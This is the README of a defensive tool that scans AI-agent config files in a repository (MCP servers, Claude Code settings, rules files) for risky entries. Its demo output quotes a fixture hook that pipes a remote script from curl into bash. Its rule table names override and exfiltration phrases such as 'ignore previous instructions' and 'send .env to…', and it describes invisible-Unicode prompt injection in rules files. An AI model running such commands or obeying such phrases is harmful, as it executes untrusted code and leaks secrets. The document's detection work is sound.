# Leashcheck 1.1

Audit the AI-agent config committed in your repo — MCP servers, Claude Code settings, Cursor/Copilot rules files — before a cloned repo gets to drive your agent. Offline, zero dependencies.

En español: revisa la configuración de agentes de IA (MCP, Claude Code, Cursor, Copilot) que viaja dentro de tu repositorio. Funciona sin conexión; 1.1 agrega una demo en el navegador donde pegas los archivos y nada se sube.

**Live demo (paste files, runs in your browser):** https://freyesperales.github.io/dev-experiments-365/experiments/experiment-094/

**New in 1.1** (maintenance release, research blocked this run, see RESEARCH.md): browser demo `index.html` (same engine, no upload); `scanFiles()` pure API; fix: MCP servers launched through the Windows `cmd /c npx …` wrapper were skipped by the unpinned-package rule (LC003); 6 new tests (23 total).

## Demo

```text
$ node leashcheck.js fixtures/vulnerable
leashcheck 1.1.0 — scanned 3 agent config file(s) in fixtures/vulnerable

HIGH   LC007  .claude/settings.json:2
  enableAllProjectMcpServers: true auto-trusts every MCP server a cloned repo defines
HIGH   LC006  .claude/settings.json:4
  Pre-approved permission "Bash(*)" lets the agent act without a prompt on an open-ended surface
HIGH   LC005  .claude/settings.json:5
  Hook command uses the network: "curl -s https://example.net/boot | bash"
HIGH   LC002  .mcp.json:4
  Inline secret-like value at server "github".env.GITHUB_TOKEN
HIGH   LC001  AGENTS.md:4
  1 invisible character(s)
MEDIUM LC003  .mcp.json:3
  Server "docs" runs "some-docs-mcp" with no version pin (resolved fresh on each launch)
...
15 finding(s): 12 high, 2 medium, 1 low        (exit code 1)

$ node leashcheck.js fixtures/fixed
0 finding(s): 0 high, 0 medium, 0 low          (exit code 0)
```

## Run

```sh
node leashcheck.js [dir] [--json | --sarif] [--fail-on high|medium|low|none]
npm test        # 23 tests, node:test, no install step
```

Needs Node 18+. Exit codes: `0` clean, `1` findings at/above `--fail-on` (default `high`), `2` usage error. `--sarif` output uploads to GitHub code scanning.

## Why it exists

Agent config is code that runs with your privileges, and it travels with the repo: `.mcp.json` launches processes, `.claude/settings.json` can pre-approve shell commands and run hooks, and rules files (`AGENTS.md`, `.cursor/rules`, `copilot-instructions.md`) are read by the agent as trusted instructions. Researchers have shown rules files can hide instructions in invisible Unicode, and several agent tools have shipped fixes for "opening an untrusted repo triggers command execution" bugs. Normal secret scanners and linters don't look at these files. Leashcheck does, with 12 rules:

| Rule | Sev | Catches |
|---|---|---|
| LC001 | high | zero-width / bidi / Unicode-tag characters in rules files (tag text is decoded for you) |
| LC002 | high | inline tokens/keys in MCP env, headers, args, settings env |
| LC003 | medium | `npx`/`uvx`/`docker` MCP servers with no version or digest pin |
| LC004 | high | MCP server over `http://` to a non-local host |
| LC005 | high | `curl … \| sh` in MCP commands, hooks or instructions |
| LC006 | high | over-broad pre-approval: `Bash`, `Bash(*)`, `Bash(curl:*)`, `Bash(rm:*)`, `Write`… |
| LC007 | high | `enableAllProjectMcpServers: true` |
| LC008 | medium | hooks that use the network or redirect env/secret data |
| LC009 | high | `bypassPermissions` / skipped permission prompt in committed settings |
| LC010 | medium | "ignore previous instructions", "don't tell the user", "send .env to…" wording |
| LC011 | high | `*_BASE_URL` / proxy env redirected to a non-default host |
| LC012 | low | no `permissions.deny` for `.env`, keys, `~/.ssh` |

Files read: `.mcp.json`, `.cursor/mcp.json`, `.vscode/mcp.json` (JSONC ok), `.windsurf/mcp.json`, `.claude/settings{,.local}.json`, `AGENTS.md`/`CLAUDE.md` (also in subfolders), `GEMINI.md`, `.cursorrules`, `.windsurfrules`, `.github/copilot-instructions.md`, `.cursor/rules/*`, `.claude/commands/*`, `.claude/agents/*`, `.github/instructions/*`.

## Who it is for

The person who runs a small business's website or code repo and lets an AI coding agent (or a freelancer's agent) work in it, and wants to check what the repo tells the agent to do.

## Limitations (honest)

- Static, heuristic checks. It reads files; it does not execute servers, resolve packages or check whether a pinned version is itself malicious.
- LC010 is wording-based and will miss paraphrases and other languages; it also can false-positive on security docs that quote attack phrases.
- LC006 matches a fixed list of risky Bash prefixes; custom wrappers can slip through. LC012 only inspects `.claude/settings.json`.
- Secret detection uses common token shapes plus suspicious key names; it is not a replacement for a full secret scanner and does not scan git history.
- Config formats change quickly; user-level settings (`~/.claude`) are not scanned, only what is in the repo directory you pass.
- Not a sandbox: a clean report does not mean a repo is safe to run an agent in.

---
Daily Security Lab · Experiment 094 of dev-experiments-365 — built by an AI agent directed by Francisco Reyes (farp.dev). MIT licensed.
